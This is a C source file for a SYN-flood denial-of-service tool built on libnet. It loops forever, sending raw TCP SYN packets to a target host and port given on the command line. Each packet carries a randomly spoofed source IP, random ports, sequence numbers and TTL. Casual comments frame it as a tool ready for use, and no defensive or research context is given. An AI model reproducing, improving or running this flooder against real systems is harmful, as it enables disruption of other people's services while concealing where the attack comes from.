#include <libnet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

#define FLOOD_DELAY_MS 5 //delay of packets sent :v

static libnet_t *l = NULL;

void stopme(int sig) {
    if (l) libnet_destroy(l);
    exit(0);
}

int main(int argc, char **argv) {
    u_long dest_ip;
    u_short dest_port;
    char errbuf[LIBNET_ERRBUF_SIZE];

    if (argc < 3) {
        fprintf(stderr, "Usage: %s <target> <port>\n", argv[0]); //target host and port EG | 192.x.x.x 80 |
        return 1;
    }

    signal(SIGINT, stopme);

    l = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (!l) { fprintf(stderr, "libnet_init: %s\n", errbuf); return 1; }

    dest_ip = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE);
    dest_port = (u_short)atoi(argv[2]);

    printf("SYN flooding %s:%u.. :v\n", argv[1], dest_port); //initialize.. coolness B)

    while (1) {
        libnet_build_tcp(
            libnet_get_prand(LIBNET_PR16),
            dest_port,
            libnet_get_prand(LIBNET_PR32),
            0,
            TH_SYN,
            libnet_get_prand(LIBNET_PR16),
            0,
            0,
            LIBNET_TCP_H,
            NULL,
            0,
            l,
            0
        );

        libnet_build_ipv4(
            LIBNET_TCP_H + LIBNET_IPV4_H,
            IPTOS_LOWDELAY,
            libnet_get_prand(LIBNET_PR16),
            0,
            libnet_get_prand(LIBNET_PR8),
            IPPROTO_TCP,
            0,
            libnet_get_prand(LIBNET_PR32),
            dest_ip,
            (const uint8_t)0,
            0,
            l,
            0
        );

        if (libnet_write(l) == -1) {
            fprintf(stderr, "libnet_write failed: %s\n", libnet_geterror(l));
            stopme(0);

        }
        usleep(FLOOD_DELAY_MS * 1000);
        libnet_clear_packet(l);

    }
    stopme(0);
    return 0;

}
